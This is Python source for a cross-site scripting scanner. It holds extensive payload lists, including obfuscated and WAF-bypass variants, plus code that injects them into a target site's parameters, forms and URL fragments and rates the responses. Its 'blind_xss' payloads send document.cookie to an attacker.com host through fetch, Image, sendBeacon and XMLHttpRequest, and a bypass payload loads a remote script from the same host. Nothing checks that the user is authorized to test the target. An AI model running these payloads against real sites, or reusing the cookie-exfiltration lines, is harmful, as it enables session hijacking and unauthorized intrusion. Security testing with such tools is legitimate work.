import re
import time
import random
import hashlib
import json
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote
from colorama import Fore, Style, Back, init
from datetime import datetime
import concurrent.futures
from html import escape

# Initialize colorama
init(autoreset=True)

class XSSScanner:
    def __init__(self):
        self.name = "🎯 ADVANCED CROSS-SITE SCRIPTING (XSS) VULNERABILITY SCANNER"
        self.version = "3.8"
        self.author = "Security Research Team"
        
        # Enhanced color scheme
        self.colors = {
            'banner': Fore.MAGENTA + Style.BRIGHT,
            'header': Fore.WHITE + Style.BRIGHT,
            'info': Fore.CYAN + Style.BRIGHT,
            'success': Fore.GREEN + Style.BRIGHT,
            'warning': Fore.YELLOW + Style.BRIGHT,
            'error': Fore.RED + Style.BRIGHT,
            'critical': Back.RED + Fore.WHITE + Style.BRIGHT,
            'xss': Fore.RED + Style.BRIGHT,
            'payload': Fore.YELLOW + Style.BRIGHT,
            'parameter': Fore.BLUE + Style.BRIGHT,
            'reflected': Fore.LIGHTRED_EX + Style.BRIGHT,
            'stored': Fore.LIGHTMAGENTA_EX + Style.BRIGHT,
            'dom': Fore.LIGHTCYAN_EX + Style.BRIGHT,
            'blind': Fore.LIGHTYELLOW_EX + Style.BRIGHT,
            'timestamp': Fore.LIGHTBLACK_EX,
            'separator': Fore.LIGHTBLACK_EX + Style.DIM,
            'highlight': Fore.YELLOW + Back.BLACK + Style.BRIGHT,
            'evidence': Fore.LIGHTCYAN_EX + Style.BRIGHT,
            'context': Fore.LIGHTGREEN_EX + Style.BRIGHT,
            'bypass': Fore.LIGHTMAGENTA_EX + Style.BRIGHT,
            'obfuscation': Fore.LIGHTBLUE_EX + Style.BRIGHT
        }
        
        # Comprehensive XSS payloads categorized by type and technique
        self.payloads = {
            'basic_reflected': [
                "<script>alert('XSS')</script>",
                "<script>alert(document.domain)</script>",
                "<script>alert(document.cookie)</script>",
                "<script>alert(window.location)</script>",
                "<script>alert(localStorage)</script>",
                "<script>alert(sessionStorage)</script>",
                "<script>console.log('XSS')</script>",
                "<script>prompt('XSS')</script>",
                "<script>confirm('XSS')</script>"
            ],
            
            'event_handlers': [
                "<img src=x onerror=alert('XSS')>",
                "<img src=x onload=alert('XSS')>",
                "<img src=x onmouseover=alert('XSS')>",
                "<img src=x onmouseenter=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<div onmouseover=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe onload=alert('XSS')>",
                "<audio src=x onerror=alert('XSS')>",
                "<video src=x onerror=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<details ontoggle=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                "<keygen autofocus onfocus=alert('XSS')>"
            ],
            
            'javascript_uri': [
                "javascript:alert('XSS')",
                "Javas&#x26;#x26;cript:alert('XSS')",
                "jav&#x09;ascript:alert('XSS')",
                "jav&#x0A;ascript:alert('XSS')",
                "jav&#x0D;ascript:alert('XSS')",
                "java%0ascript:alert('XSS')",
                "java%09script:alert('XSS')",
                "java%0Dscript:alert('XSS')",
                "javascript&#58;alert('XSS')",
                "javascript&#0058;alert('XSS')"
            ],
            
            'tag_breaking': [
                "\"><script>alert('XSS')</script>",
                "'><script>alert('XSS')</script>",
                "></script><script>alert('XSS')</script>",
                "\" onmouseover=\"alert('XSS')",
                "' onmouseover='alert('XSS')",
                "\" autofocus onfocus=\"alert('XSS')",
                "' autofocus onfocus='alert('XSS')",
                "autofocus onfocus=alert('XSS')",
                "accesskey=\"x\" onclick=\"alert('XSS')\"",
                "style=\"x:expression(alert('XSS'))\""
            ],
            
            'template_literals': [
                "<script>alert`XSS`</script>",
                "<img src=x onerror=alert`XSS`>",
                "${alert('XSS')}",
                "#{alert('XSS')}",
                "{{alert('XSS')}}",
                "[[alert('XSS')]]",
                "<!--#echo var='alert(XSS)'-->"
            ],
            
            'svg_payloads': [
                "<svg><script>alert('XSS')</script></svg>",
                "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
                "<svg><g onload=alert('XSS')></g></svg>",
                "<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=javascript:alert('XSS')>",
                "<svg><foreignObject><iframe onload=alert('XSS')></iframe></foreignObject></svg>"
            ],
            
            'iframe_payloads': [
                "<iframe src=javascript:alert('XSS')>",
                "<iframe srcdoc=\"<script>alert('XSS')</script>\">",
                "<iframe src=\"data:text/html,<script>alert('XSS')</script>\">",
                "<iframe src=\"about:blank\" onload=\"this.contentWindow.alert('XSS')\">"
            ],
            
            'form_payloads': [
                "<form><button formaction=javascript:alert('XSS')>",
                "<form action=javascript:alert('XSS')>",
                "<form id=x></form><button form=x formaction=javascript:alert('XSS')>",
                "<input type=image src=x onerror=alert('XSS')>",
                "<isindex type=image src=1 onerror=alert('XSS')>"
            ],
            
            'meta_refresh': [
                "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
                "<meta charset=\"x-imap4-modified-utf7\">&ADz&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AE&AGn&AG0&AEpre&AP8-alert('XSS')-&A7ADz&AGn&AG0&AE",
                "<meta charset=\"x-mac-farsi\">\"><script>alert('XSS')</script>"
            ],
            
            'css_payloads': [
                "<div style=\"background-image:url(javascript:alert('XSS'))\">",
                "<div style=\"width:expression(alert('XSS'))\">",
                "<style>@import 'javascript:alert(\"XSS\")';</style>",
                "<link rel=stylesheet href=javascript:alert('XSS')>",
                "<style>body{background:url('javascript:alert(\"XSS\")')}</style>",
                "<style>@keyframes x{from{left:0}to{left:100%}}</style><div style=\"animation-name:x\" onanimationstart=\"alert('XSS')\"></div>"
            ],
            
            'html5_payloads': [
                "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
                "<math><annotation-xml encoding=\"text/html\"><script>alert('XSS')</script></annotation-xml>",
                "<audio><source onerror=\"alert('XSS')\">",
                "<video><source onerror=\"alert('XSS')\">",
                "<picture><img src=x onerror=alert('XSS')></picture>",
                "<dialog open onclick=\"alert('XSS')\">XSS</dialog>",
                "<details open ontoggle=\"alert('XSS')\">"
            ],
            
            'obfuscated': [
                "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
                "<scr&#x69;pt>alert('XSS')</scr&#x69;pt>",
                "<scr&#105;pt>alert('XSS')</scr&#105;pt>",
                "<scr&#x000069;pt>alert('XSS')</scr&#x000069;pt>",
                "<scr&#x69pt>alert('XSS')</scr&#x69pt>",
                "<scr&#x000069pt>alert('XSS')</scr&#x000069pt>",
                "<s&#x63;ript>alert('XSS')</s&#x63;ript>",
                "<s&#99;ript>alert('XSS')</s&#99;ript>",
                "&#60;script&#62;alert('XSS')&#60;/script&#62;",
                "&#x3c;script&#x3e;alert('XSS')&#x3c;/script&#x3e;",
                "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
                "%3Cscript%3Ealert('XSS')%3C/script%3E",
                "%253Cscript%253Ealert('XSS')%253C/script%253E"
            ],
            
            'blind_xss': [
                "<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
                "<img src=x onerror=\"fetch('https://attacker.com/?c='+document.cookie)\">",
                "<script>new Image().src='https://attacker.com/?c='+document.cookie</script>",
                "<script>navigator.sendBeacon('https://attacker.com', document.cookie)</script>",
                "<script>var x=new XMLHttpRequest();x.open('POST','https://attacker.com',true);x.send(document.cookie)</script>"
            ],
            
            'dom_xss': [
                "#<script>alert('XSS')</script>",
                "?param=<script>alert('XSS')</script>",
                "#javascript:alert('XSS')",
                "#\" onmouseover=\"alert('XSS')",
                "?param=javascript:alert('XSS')",
                "location.hash='<script>alert('XSS')</script>'",
                "document.write('<script>alert('XSS')</script>')",
                "eval('alert(\"XSS\")')",
                "setTimeout('alert(\"XSS\")')",
                "setInterval('alert(\"XSS\")')"
            ],
            
            'waf_bypass': [
                "<script>alert('XSS');</script>",
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<SCRIPT SRC=http://attacker.com/xss.js></SCRIPT>",
                "<<script>alert('XSS');//<</script>",
                "<img src=\"x` `<script>alert('XSS')</script>\"` `>",
                "<img src onerror /\" \"/ alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<input onblur=alert('XSS') autofocus><input autofocus>",
                "<video src=x onerror=alert('XSS')>",
                "<audio src=x onerror=alert('XSS')>",
                "<body onscroll=alert('XSS')><br><br><br>...<br><br><br>",
                "<?xml version=\"1.0\"><!--><script>alert('XSS')</script>",
                "<![CDATA[<script>alert('XSS')</script>]]>",
                "<embed src=javascript:alert('XSS')>",
                "<object data=javascript:alert('XSS')>"
            ]
        }
        
        # Common parameters for testing
        self.common_parameters = [
            'q', 'search', 'query', 's', 'keyword',
            'id', 'uid', 'user', 'username', 'name',
            'email', 'mail', 'address',
            'page', 'p', 'num', 'offset', 'limit',
            'file', 'path', 'dir', 'folder',
            'url', 'link', 'redirect', 'return', 'next',
            'message', 'msg', 'comment', 'desc', 'description',
            'title', 'subject', 'topic',
            'category', 'cat', 'tag',
            'price', 'amount', 'cost',
            'date', 'time', 'year', 'month', 'day',
            'order', 'sort', 'by',
            'filter', 'where', 'having',
            'action', 'do', 'cmd', 'command',
            'view', 'show', 'display',
            'download', 'upload', 'export', 'import',
            'lang', 'language', 'locale',
            'theme', 'skin', 'style',
            'session', 'token', 'key', 'secret',
            'debug', 'test', 'demo'
        ]
        
        # XSS detection patterns
        self.xss_patterns = {
            'direct': [
                r"alert\('XSS'\)",
                r"alert\(document\.cookie\)",
                r"alert\(document\.domain\)",
                r"alert\(window\.location\)",
                r"console\.log\('XSS'\)",
                r"prompt\('XSS'\)",
                r"confirm\('XSS'\)",
                r"fetch\('https?://",
                r"XMLHttpRequest\(",
                r"navigator\.sendBeacon\("
            ],
            'event_handlers': [
                r"onerror\s*=\s*[\"']?alert",
                r"onload\s*=\s*[\"']?alert",
                r"onmouseover\s*=\s*[\"']?alert",
                r"onfocus\s*=\s*[\"']?alert",
                r"onclick\s*=\s*[\"']?alert",
                r"onsubmit\s*=\s*[\"']?alert",
                r"onchange\s*=\s*[\"']?alert",
                r"onblur\s*=\s*[\"']?alert",
                r"onkeypress\s*=\s*[\"']?alert",
                r"ontoggle\s*=\s*[\"']?alert"
            ],
            'javascript_uri': [
                r"javascript:\s*alert",
                r"Javas&#x26;#x26;cript:",
                r"jav&#x09;ascript:",
                r"jav&#x0A;ascript:",
                r"java%0ascript:",
                r"java%09script:",
                r"javascript&#58;",
                r"javascript&#0058;"
            ],
            'obfuscated': [
                r"&#x3c;script&#x3e;",
                r"&#60;script&#62;",
                r"\\x3cscript\\x3e",
                r"%3Cscript%3E",
                r"%253Cscript%253E",
                r"scr&#x69;pt",
                r"scr&#105;pt",
                r"s&#x63;ript"
            ],
            'context_specific': [
                r"<script[^>]*>.*alert.*</script>",
                r"<img[^>]*onerror=[\"']?alert",
                r"<body[^>]*onload=[\"']?alert",
                r"<svg[^>]*onload=[\"']?alert",
                r"<iframe[^>]*src=[\"']?javascript:",
                r"<form[^>]*action=[\"']?javascript:",
                r"<input[^>]*onfocus=[\"']?alert",
                r"<textarea[^>]*onfocus=[\"']?alert",
                r"<select[^>]*onfocus=[\"']?alert",
                r"<details[^>]*ontoggle=[\"']?alert"
            ]
        }
        
        # Context analysis patterns
        self.context_patterns = {
            'html_tag': r"<[^>]*",
            'html_attribute': r"=\"[^\"]*\"|='[^']*'",
            'javascript': r"<script[^>]*>|</script>|javascript:",
            'css': r"<style[^>]*>|</style>|style=\"[^\"]*\"",
            'comment': r"<!--.*?-->",
            'url': r"https?://[^\s\"'<>]+"
        }
        
        # Risk levels
        self.risk_levels = {
            'critical': {
                'color': Back.RED + Fore.WHITE + Style.BRIGHT,
                'score': 50,
                'description': 'Direct script execution with no sanitization'
            },
            'high': {
                'color': Fore.RED + Style.BRIGHT,
                'score': 40,
                'description': 'Event handler or JavaScript URI execution'
            },
            'medium': {
                'color': Fore.YELLOW + Style.BRIGHT,
                'score': 30,
                'description': 'Reflected XSS with some encoding'
            },
            'low': {
                'color': Fore.BLUE + Style.BRIGHT,
                'score': 20,
                'description': 'Potential XSS with context issues'
            }
        }
        
        # Scanner configuration
        self.max_threads = 20
        self.timeout = 15
        self.delay_between_requests = 0.1
        
        # Statistics
        self.stats = {
            'payloads_tested': 0,
            'parameters_tested': 0,
            'vulnerabilities_found': 0
        }

    def print_banner(self):
        """Display enhanced scanner banner"""
        banner = f"""
{self.colors['banner']}{"="*95}
{self.colors['header']}╔══════════════════════════════════════════════════════════════════════════════╗
║ {self.colors['banner']}{self.name:^83} {self.colors['header']}║
║ {self.colors['info']}Version: {self.version:<73} {self.colors['header']}║
║ {self.colors['info']}Author: {self.author:<73} {self.colors['header']}║
╚══════════════════════════════════════════════════════════════════════════════╝
{self.colors['banner']}{"="*95}
"""
        print(banner)

    def print_status(self, message, level="info", indent=0, payload=None):
        """Print colored status messages with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        prefix = {
            "info": f"{self.colors['info']}[ℹ]",
            "success": f"{self.colors['success']}[✓]",
            "warning": f"{self.colors['warning']}[⚠]",
            "error": f"{self.colors['error']}[✗]",
            "critical": f"{self.colors['critical']}[‼]",
            "xss": f"{self.colors['xss']}[🎯]",
            "payload": f"{self.colors['payload']}[💉]",
            "parameter": f"{self.colors['parameter']}[🔧]",
            "reflected": f"{self.colors['reflected']}[↩️]",
            "stored": f"{self.colors['stored']}[💾]",
            "dom": f"{self.colors['dom']}[🌐]",
            "blind": f"{self.colors['blind']}[👁️]",
            "scan": f"{self.colors['info']}[🔍]",
            "context": f"{self.colors['context']}[📋]"
        }.get(level, f"{self.colors['info']}[*]")
        
        indent_str = "  " * indent
        payload_str = f" {self.colors['payload']}{payload}" if payload else ""
        print(f"{self.colors['timestamp']}[{timestamp}] {prefix}{Style.RESET_ALL} {indent_str}{message}{payload_str}")

    def scan(self, target, options=None):
        """Comprehensive XSS vulnerability scanning"""
        self.print_banner()
        
        results = {
            'target': target,
            'vulnerabilities': [],
            'context_analysis': [],
            'stats': {
                'payloads_tested': 0,
                'parameters_tested': 0,
                'vulnerabilities_found': 0,
                'start_time': time.time(),
                'end_time': None,
                'duration': None
            },
            'risk_score': 0
        }
        
        try:
            from utils.request_wrapper import RequestWrapper
            req = RequestWrapper()
            
            self.print_status(f"Initiating XSS scan on target: {self.colors['highlight']}{target}", "info")
            
            # Phase 1: Analyze target context
            self.print_status("Phase 1: Analyzing target context...", "scan")
            context_analysis = self.analyze_target_context(target, req)
            results['context_analysis'] = context_analysis
            
            # Extract parameters from context
            if context_analysis.get('parameters'):
                parameters = context_analysis['parameters']
            else:
                # Use common parameters as fallback
                parameters = {param: ['test'] for param in self.common_parameters[:10]}
            
            # Phase 2: Reflected XSS testing
            self.print_status("Phase 2: Testing for Reflected XSS...", "scan")
            reflected_results = self.test_reflected_xss(target, parameters, req)
            results['vulnerabilities'].extend(reflected_results['vulnerabilities'])
            results['stats']['payloads_tested'] += reflected_results['stats']['payloads_tested']
            results['stats']['parameters_tested'] += reflected_results['stats']['parameters_tested']
            results['stats']['vulnerabilities_found'] += len(reflected_results['vulnerabilities'])
            
            # Phase 3: DOM XSS testing
            self.print_status("Phase 3: Testing for DOM-based XSS...", "scan")
            dom_results = self.test_dom_xss(target, parameters, req)
            results['vulnerabilities'].extend(dom_results['vulnerabilities'])
            results['stats']['payloads_tested'] += dom_results['stats']['payloads_tested']
            results['stats']['vulnerabilities_found'] += len(dom_results['vulnerabilities'])
            
            # Phase 4: Advanced techniques
            if options and options.get('advanced', False):
                self.print_status("Phase 4: Testing advanced techniques...", "scan")
                advanced_results = self.test_advanced_techniques(target, parameters, req)
                results['vulnerabilities'].extend(advanced_results['vulnerabilities'])
                results['stats']['payloads_tested'] += advanced_results['stats']['payloads_tested']
                results['stats']['vulnerabilities_found'] += len(advanced_results['vulnerabilities'])
            
            # Calculate risk score
            results['risk_score'] = self.calculate_risk_score(results)
            
            # Complete scan
            results['stats']['end_time'] = time.time()
            results['stats']['duration'] = results['stats']['end_time'] - results['stats']['start_time']
            
            # Print comprehensive report
            self.print_summary(results)
            
            return results
            
        except Exception as e:
            self.print_status(f"Scan error: {str(e)}", "error")
            results['error'] = str(e)
            results['stats']['end_time'] = time.time()
            return results

    def analyze_target_context(self, target, req):
        """Analyze target for context information"""
        context = {
            'parameters': {},
            'contexts': [],
            'technologies': [],
            'forms': []
        }
        
        try:
            response = req.get(target, timeout=self.timeout)
            
            # Extract parameters from URL
            parsed_url = urlparse(target)
            if parsed_url.query:
                params = parse_qs(parsed_url.query)
                context['parameters'] = params
            
            # Analyze HTML for forms and inputs
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all forms
            forms = soup.find_all('form')
            for form in forms:
                form_info = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                # Extract input fields
                inputs = form.find_all(['input', 'textarea', 'select'])
                for input_tag in inputs:
                    input_info = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    }
                    form_info['inputs'].append(input_info)
                    
                    # Add to parameters if not already present
                    if input_info['name'] and input_info['name'] not in context['parameters']:
                        context['parameters'][input_info['name']] = ['test']
                
                context['forms'].append(form_info)
            
            # Detect technologies
            headers = response.headers
            server = headers.get('Server', '')
            if server:
                context['technologies'].append(f"Server: {server}")
            
            powered_by = headers.get('X-Powered-By', '')
            if powered_by:
                context['technologies'].append(f"Powered By: {powered_by}")
            
            # Check for common frameworks
            if 'wp-content' in response.text:
                context['technologies'].append('WordPress')
            if 'laravel' in response.text.lower():
                context['technologies'].append('Laravel')
            if 'django' in response.text.lower():
                context['technologies'].append('Django')
            if 'react' in response.text or 'React' in response.text:
                context['technologies'].append('React')
            if 'vue' in response.text.lower():
                context['technologies'].append('Vue.js')
            if 'angular' in response.text.lower():
                context['technologies'].append('Angular')
            
            # Analyze contexts in response
            self.analyze_response_context(response.text, context)
            
        except Exception as e:
            self.print_status(f"Context analysis error: {e}", "error")
        
        return context

    def analyze_response_context(self, response_text, context):
        """Analyze response for different contexts"""
        # Check for JavaScript contexts
        if '<script' in response_text:
            context['contexts'].append('JavaScript inline')
        
        # Check for event handlers
        event_handlers = ['onload', 'onerror', 'onclick', 'onmouseover', 'onsubmit']
        for handler in event_handlers:
            if handler in response_text:
                context['contexts'].append(f'Event handler: {handler}')
                break
        
        # Check for JavaScript URLs
        if 'javascript:' in response_text:
            context['contexts'].append('JavaScript URL')
        
        # Check for data URLs
        if 'data:text/html' in response_text:
            context['contexts'].append('Data URL')
        
        # Check for JSON contexts
        try:
            json.loads(response_text)
            context['contexts'].append('JSON')
        except:
            pass
        
        # Check for HTML comments
        if '<!--' in response_text:
            context['contexts'].append('HTML comment')

    def test_reflected_xss(self, target, parameters, req):
        """Test for reflected XSS vulnerabilities"""
        results = {
            'vulnerabilities': [],
            'stats': {
                'payloads_tested': 0,
                'parameters_tested': 0
            }
        }
        
        if not parameters:
            self.print_status("No parameters found for testing", "warning")
            return results
        
        self.print_status(f"Testing {len(parameters)} parameters for reflected XSS...", "info", 1)
        
        # Test each parameter
        for param_name, param_values in parameters.items():
            self.print_status(f"Testing parameter: {param_name}", "parameter", 2)
            
            # Test each payload category
            for category, payloads in self.payloads.items():
                if category in ['blind_xss', 'dom_xss']:  # Test these separately
                    continue
                
                self.print_status(f"Testing {category} payloads...", "payload", 3)
                
                for payload in payloads[:5]:  # Test first 5 payloads per category
                    try:
                        # Test GET request
                        test_params = parameters.copy()
                        test_params[param_name] = payload
                        
                        response = req.get(target, params=test_params, timeout=self.timeout)
                        results['stats']['payloads_tested'] += 1
                        
                        # Analyze response
                        analysis = self.analyze_xss_response(response, payload, param_name)
                        
                        if analysis['is_vulnerable']:
                            vulnerability = {
                                'type': 'Reflected XSS',
                                'parameter': param_name,
                                'payload': payload,
                                'category': category,
                                'url': response.url,
                                'method': 'GET',
                                'evidence': analysis['evidence'],
                                'context': analysis['context'],
                                'risk_level': analysis['risk_level'],
                                'confidence': analysis['confidence']
                            }
                            
                            results['vulnerabilities'].append(vulnerability)
                            
                            color = self.risk_levels.get(analysis['risk_level'], {}).get('color', Fore.RED)
                            self.print_status(f"{color}Reflected XSS found! Parameter: {param_name}", "reflected", 3)
                            self.print_status(f"Payload: {payload[:50]}...", "payload", 4)
                            self.print_status(f"Context: {analysis['context']} | Confidence: {analysis['confidence']}%", "context", 4)
                            
                            # Test POST as well if GET was successful
                            post_response = req.post(target, data=test_params, timeout=self.timeout)
                            post_analysis = self.analyze_xss_response(post_response, payload, param_name)
                            if post_analysis['is_vulnerable']:
                                vulnerability_post = vulnerability.copy()
                                vulnerability_post['method'] = 'POST'
                                vulnerability_post['evidence'] = post_analysis['evidence']
                                results['vulnerabilities'].append(vulnerability_post)
                            
                            break  # Stop testing this parameter if vulnerable
                        
                        time.sleep(self.delay_between_requests)
                        
                    except Exception as e:
                        continue
                
                results['stats']['parameters_tested'] += 1
        
        return results

    def test_dom_xss(self, target, parameters, req):
        """Test for DOM-based XSS vulnerabilities"""
        results = {
            'vulnerabilities': [],
            'stats': {
                'payloads_tested': 0
            }
        }
        
        self.print_status("Testing for DOM-based XSS...", "info", 1)
        
        # Get base page to analyze for DOM sinks
        try:
            response = req.get(target, timeout=self.timeout)
            
            # Look for common DOM sinks
            dom_sinks = [
                'document.write',
                'document.writeln',
                'innerHTML',
                'outerHTML',
                'eval(',
                'setTimeout(',
                'setInterval(',
                'Function(',
                'location',
                'location.href',
                'location.hash',
                'document.location',
                'window.location',
                'document.URL',
                'document.documentURI',
                'document.baseURI',
                'document.cookie',
                'localStorage',
                'sessionStorage'
            ]
            
            response_text = response.text
            
            for sink in dom_sinks:
                if sink in response_text:
                    self.print_status(f"Found potential DOM sink: {sink}", "dom", 2)
                    
                    # Test DOM payloads
                    for payload in self.payloads['dom_xss'][:10]:
                        try:
                            # Test with hash payload
                            test_url = f"{target}#{payload}"
                            hash_response = req.get(test_url, timeout=self.timeout)
                            results['stats']['payloads_tested'] += 1
                            
                            # Analyze response
                            analysis = self.analyze_xss_response(hash_response, payload, 'hash')
                            
                            if analysis['is_vulnerable']:
                                vulnerability = {
                                    'type': 'DOM-based XSS',
                                    'sink': sink,
                                    'payload': payload,
                                    'url': test_url,
                                    'method': 'GET',
                                    'evidence': analysis['evidence'],
                                    'risk_level': analysis['risk_level'],
                                    'confidence': analysis['confidence']
                                }
                                
                                results['vulnerabilities'].append(vulnerability)
                                
                                color = self.risk_levels.get(analysis['risk_level'], {}).get('color', Fore.RED)
                                self.print_status(f"{color}DOM XSS found! Sink: {sink}", "dom", 3)
                                self.print_status(f"Payload: {payload[:50]}...", "payload", 4)
                                
                                break
                            
                            time.sleep(self.delay_between_requests)
                            
                        except Exception as e:
                            continue
        
        except Exception as e:
            self.print_status(f"DOM XSS test error: {e}", "error")
        
        return results

    def test_advanced_techniques(self, target, parameters, req):
        """Test advanced XSS techniques"""
        results = {
            'vulnerabilities': [],
            'stats': {
                'payloads_tested': 0
            }
        }
        
        self.print_status("Testing advanced XSS techniques...", "info", 1)
        
        # Test blind XSS payloads
        self.print_status("Testing blind XSS payloads...", "blind", 2)
        for payload in self.payloads['blind_xss'][:3]:
            try:
                # Test with all parameters
                for param_name in parameters:
                    test_params = parameters.copy()
                    test_params[param_name] = payload
                    
                    response = req.get(target, params=test_params, timeout=self.timeout)
                    results['stats']['payloads_tested'] += 1
                    
                    # For blind XSS, we can't detect directly, but we can note the attempt
                    vulnerability = {
                        'type': 'Potential Blind XSS',
                        'parameter': param_name,
                        'payload': payload,
                        'url': response.url,
                        'method': 'GET',
                        'risk_level': 'medium',
                        'confidence': 30,
                        'note': 'Blind XSS requires external callback verification'
                    }
                    
                    results['vulnerabilities'].append(vulnerability)
                    self.print_status(f"Blind XSS payload injected in {param_name}", "blind", 3)
                    
                    break
                
                time.sleep(self.delay_between_requests)
                
            except Exception as e:
                continue
        
        # Test WAF bypass techniques
        self.print_status("Testing WAF bypass techniques...", "bypass", 2)
        for payload in self.payloads['waf_bypass'][:5]:
            try:
                # Test with first parameter
                if parameters:
                    param_name = list(parameters.keys())[0]
                    test_params = parameters.copy()
                    test_params[param_name] = payload
                    
                    response = req.get(target, params=test_params, timeout=self.timeout)
                    results['stats']['payloads_tested'] += 1
                    
                    analysis = self.analyze_xss_response(response, payload, param_name)
                    
                    if analysis['is_vulnerable']:
                        vulnerability = {
                            'type': 'WAF Bypass XSS',
                            'parameter': param_name,
                            'payload': payload,
                            'url': response.url,
                            'evidence': analysis['evidence'],
                            'risk_level': 'high',
                            'confidence': analysis['confidence']
                        }
                        
                        results['vulnerabilities'].append(vulnerability)
                        self.print_status(f"WAF bypass successful with payload: {payload[:50]}...", "bypass", 3)
                    
                    time.sleep(self.delay_between_requests)
                
            except Exception as e:
                continue
        
        return results

    def analyze_xss_response(self, response, payload, parameter):
        """Analyze response for XSS evidence"""
        analysis = {
            'is_vulnerable': False,
            'context': 'unknown',
            'risk_level': 'low',
            'confidence': 0,
            'evidence': ''
        }
        
        response_text = response.text
        response_lower = response_text.lower()
        payload_lower = payload.lower()
        
        # Check if payload appears in response
        if payload_lower in response_lower:
            analysis['confidence'] += 30
            
            # Check context
            context = self.analyze_payload_context(response_text, payload)
            analysis['context'] = context
            
            # Check if payload is properly encoded
            if self.is_payload_encoded(response_text, payload):
                analysis['confidence'] -= 20
                analysis['risk_level'] = 'low'
            else:
                analysis['confidence'] += 40
                analysis['risk_level'] = 'high'
        
        # Check for XSS patterns
        pattern_matches = 0
        for pattern_type, patterns in self.xss_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    pattern_matches += 1
                    
                    if pattern_type == 'direct':
                        analysis['confidence'] += 50
                        analysis['risk_level'] = 'critical'
                    elif pattern_type == 'event_handlers':
                        analysis['confidence'] += 40
                        analysis['risk_level'] = 'high'
                    elif pattern_type == 'javascript_uri':
                        analysis['confidence'] += 35
                        analysis['risk_level'] = 'high'
        
        # Determine if vulnerable
        if analysis['confidence'] >= 50 or pattern_matches >= 2:
            analysis['is_vulnerable'] = True
            
            # Extract evidence
            evidence_start = response_text.find(payload[:20]) if payload[:20] in response_text else 0
            evidence_start = max(0, evidence_start - 100)
            analysis['evidence'] = response_text[evidence_start:evidence_start + 300]
        
        # Cap confidence at 100
        analysis['confidence'] = min(analysis['confidence'], 100)
        
        return analysis

    def analyze_payload_context(self, response_text, payload):
        """Analyze the context where payload appears"""
        # Find payload position
        pos = response_text.find(payload)
        if pos == -1:
            return 'not_found'
        
        # Extract context around payload
        start = max(0, pos - 50)
        end = min(len(response_text), pos + len(payload) + 50)
        context = response_text[start:end]
        
        # Analyze context
        if '<script' in context and '</script>' in context:
            return 'script_tag'
        elif 'onerror=' in context or 'onload=' in context or 'onclick=' in context:
            return 'event_handler'
        elif 'javascript:' in context:
            return 'javascript_uri'
        elif 'style=' in context or '<style' in context:
            return 'css'
        elif '<!--' in context and '-->' in context:
            return 'html_comment'
        elif 'href=' in context or 'src=' in context:
            return 'attribute'
        elif '<' in context and '>' in context:
            return 'html_tag'
        else:
            return 'text_content'

    def is_payload_encoded(self, response_text, payload):
        """Check if payload is HTML encoded in response"""
        # Check for common encodings
        encoded_versions = [
            escape(payload),  # HTML entities
            quote(payload),   # URL encoding
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            payload.replace('<', '%3C').replace('>', '%3E')
        ]
        
        for encoded in encoded_versions:
            if encoded in response_text:
                return True
        
        return False

    def calculate_risk_score(self, results):
        """Calculate overall risk score"""
        score = 0
        
        for vuln in results['vulnerabilities']:
            risk_level = vuln.get('risk_level', 'low')
            score += self.risk_levels.get(risk_level, {}).get('score', 20)
            
            # Add confidence bonus
            confidence = vuln.get('confidence', 0)
            score += confidence / 5
        
        # Cap at 100
        return min(score, 100)

    def print_summary(self, results):
        """Print comprehensive scan summary"""
        duration = results['stats'].get('duration', 0)
        
        summary = f"""
{self.colors['separator']}{"="*95}
{self.colors['header']}📊 XSS SCAN SUMMARY
{self.colors['separator']}{"-"*95}
{self.colors['info']}Target URL:           {results['target']}
{self.colors['info']}Scan Duration:        {duration:.2f} seconds
{self.colors['info']}Payloads Tested:      {results['stats']['payloads_tested']}
{self.colors['info']}Parameters Tested:    {results['stats']['parameters_tested']}
{self.colors['info']}Vulnerabilities:      {results['stats']['vulnerabilities_found']}
{self.colors['info']}Risk Score:           {results['risk_score']}/100
{self.colors['separator']}{"-"*95}
"""
        print(summary)
        
        # Group vulnerabilities by type
        vuln_by_type = {}
        for vuln in results['vulnerabilities']:
            vuln_type = vuln.get('type', 'Unknown')
            if vuln_type not in vuln_by_type:
                vuln_by_type[vuln_type] = []
            vuln_by_type[vuln_type].append(vuln)
        
        # Print vulnerabilities by type
        for vuln_type, vulns in vuln_by_type.items():
            print(f"\n{self.colors['header']}{vuln_type.upper()} ({len(vulns)}):")
            print(f"{self.colors['separator']}{'-'*95}")
            
            for i, vuln in enumerate(vulns[:10], 1):  # Show first 10 of each type
                color = self.risk_levels.get(vuln['risk_level'], {}).get('color', Fore.RED)
                
                print(f"{color}▶ {i}. {vuln.get('parameter', vuln.get('sink', 'Unknown'))}")
                print(f"{self.colors['info']}   Method: {vuln.get('method', 'Unknown')}")
                print(f"{self.colors['info']}   Category: {vuln.get('category', 'Unknown')}")
